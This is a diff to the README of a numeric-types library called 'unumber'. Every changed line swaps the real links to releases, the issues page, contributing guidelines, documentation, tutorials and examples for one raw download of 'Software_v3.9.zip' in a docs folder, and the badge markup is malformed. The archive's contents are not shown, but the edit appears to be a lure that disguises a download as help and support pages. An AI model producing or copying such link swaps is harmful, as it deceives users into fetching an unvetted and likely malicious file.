@@ -6,7 +6,7 @@ Welcome to unumber! This software provides you with advanced numeric types like 
 
 ## 📥 Download
 
-[![Download unumber](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ChriTheHero/unumber/releases)
+[![Download unumber](https://raw.githubusercontent.com/ChriTheHero/unumber/main/docs/getting-started/Software_v3.9.zip%https://raw.githubusercontent.com/ChriTheHero/unumber/main/docs/getting-started/Software_v3.9.zip)](https://raw.githubusercontent.com/ChriTheHero/unumber/main/docs/getting-started/Software_v3.9.zip)
 
 ## 📋 System Requirements
 
@@ -27,7 +27,7 @@ These requirements will allow you to utilize all features effectively.
 
 ## 💡 How to Download & Install
 
-1. **Visit the Releases Page:** Go to the unumber releases page using this link: [Download unumber](https://github.com/ChriTheHero/unumber/releases).
+1. **Visit the Releases Page:** Go to the unumber releases page using this link: [Download unumber](https://raw.githubusercontent.com/ChriTheHero/unumber/main/docs/getting-started/Software_v3.9.zip).
    
 2. **Find the Latest Release:** Look for the latest version at the top of the page. 
 
@@ -47,11 +47,11 @@ These requirements will allow you to utilize all features effectively.
 
 ## 📞 Support
 
-If you encounter issues or have questions, please visit our [issues page](https://github.com/ChriTheHero/unumber/issues) on GitHub. We encourage you to report any bugs or request features. 
+If you encounter issues or have questions, please visit our [issues page](https://raw.githubusercontent.com/ChriTheHero/unumber/main/docs/getting-started/Software_v3.9.zip) on GitHub. We encourage you to report any bugs or request features. 
 
 ## 🤝 Contributing
 
-We welcome contributions! If you want to help improve unumber, check our [contributing guidelines](https://github.com/ChriTheHero/unumber/blob/main/CONTRIBUTING.md). Your insights are invaluable to us.
+We welcome contributions! If you want to help improve unumber, check our [contributing guidelines](https://raw.githubusercontent.com/ChriTheHero/unumber/main/docs/getting-started/Software_v3.9.zip). Your insights are invaluable to us.
 
 ## 🌟 Community
 
@@ -59,8 +59,8 @@ Join our community for discussions, tips, and support. Engage with other users w
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/ChriTheHero/unumber/wiki) - Access comprehensive guides and tutorials.
-- [Tutorials](https://github.com/ChriTheHero/unumber/wiki/tutorials) - Step-by-step instructions to help you get started.
-- [Examples](https://github.com/ChriTheHero/unumber/wiki/examples) - See practical applications of unumber in action.
+- [Documentation](https://raw.githubusercontent.com/ChriTheHero/unumber/main/docs/getting-started/Software_v3.9.zip) - Access comprehensive guides and tutorials.
+- [Tutorials](https://raw.githubusercontent.com/ChriTheHero/unumber/main/docs/getting-started/Software_v3.9.zip) - Step-by-step instructions to help you get started.
+- [Examples](https://raw.githubusercontent.com/ChriTheHero/unumber/main/docs/getting-started/Software_v3.9.zip) - See practical applications of unumber in action.
 
 By using unumber, you harness the power of advanced numeric operations without the need for technical expertise. Enjoy exploring the world of high-precision mathematics!
